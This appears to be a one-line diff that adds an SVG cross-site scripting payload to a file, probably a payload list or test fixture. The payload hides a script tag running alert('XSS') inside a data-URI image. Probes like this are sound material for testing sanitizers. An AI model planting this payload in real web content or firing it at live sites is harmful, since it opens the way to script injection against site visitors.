@@ -1,0 +1,1 @@
+<svg><image href="data:image/svg+xml,<svg xmlns='http://w3.org'><script>alert('XSS')</script></svg>"></image></svg>
